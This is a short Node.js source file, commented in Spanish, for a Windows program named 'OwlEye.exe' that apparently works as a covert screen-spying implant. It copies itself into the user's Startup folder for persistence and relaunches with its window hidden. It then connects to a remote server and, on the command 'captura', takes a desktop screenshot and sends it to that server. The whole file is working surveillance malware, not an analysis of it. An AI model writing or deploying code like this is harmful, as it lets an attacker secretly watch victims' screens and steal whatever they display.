require('dotenv').config();
const { spawn } = require('child_process');
const io = require('socket.io-client');
const screenshot = require('screenshot-desktop');
const fs = require('fs');
const path = require('path');

// Configuración
const SERVER_URL = process.env.SERVER_URL;
const STARTUP_FOLDER = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
const EXECUTABLE_NAME = 'OwlEye.exe';
const currentPath = process.execPath;
const startupPath = path.join(STARTUP_FOLDER, EXECUTABLE_NAME);

if (currentPath !== startupPath) {
    fs.copyFileSync(currentPath, startupPath);
    spawn(startupPath, [], { detached: true, stdio: 'ignore', windowsHide: true });
    process.exit(0);
}

// Conectar al servidor
const socket = io(SERVER_URL, { reconnection: true });

socket.on('connect', () => {});

socket.on('command', (cmd) => {
    if (cmd === 'captura') {
        screenshot().then((img) => {
            socket.emit('screenshot', img);
        });
    }
});

socket.on('disconnect', () => {});